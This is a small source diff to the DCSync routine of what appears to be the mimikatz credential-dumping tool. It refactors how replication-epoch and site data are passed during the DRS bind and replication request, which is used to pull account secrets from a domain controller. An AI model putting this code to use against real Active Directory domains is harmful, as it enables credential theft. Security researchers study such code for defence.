@@ -1727,8 +1727,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	ULONG drsStatus;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
 	LPWSTR szTmpDc = NULL;
-	DWORD dwReplEpoch;
-	GUID SiteObjGuid, ConfigObjGUID;
+	DRS_EXTENSIONS_INT DrsExtensionsInt;
 
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
@@ -1753,12 +1752,12 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 
 				if(kull_m_rpc_drsr_createBinding(szDc, &hBinding))
 				{
-					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &dwReplEpoch, &SiteObjGuid, &ConfigObjGUID))
+					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
 					{
-						if(dwReplEpoch)
-							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", dwReplEpoch);
+						if(DrsExtensionsInt.dwReplEpoch)
+							kprintf(L"[DC] ms-DS-ReplicationEpoch is: %u\n", DrsExtensionsInt.dwReplEpoch);
 						
-						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &dwReplEpoch, &SiteObjGuid, &ConfigObjGUID))
+						if(kull_m_rpc_drsr_getDCBind(&hBinding, &getChReq.V8.uuidDsaObjDest, &hDrs, &DrsExtensionsInt))
 						{
 							getChReq.V8.pNC = &dsName;
 							getChReq.V8.ulFlags = DRS_INIT_SYNC | DRS_WRIT_REP | DRS_NEVER_SYNCED | DRS_FULL_SYNC_NOW | DRS_SYNC_URGENT;
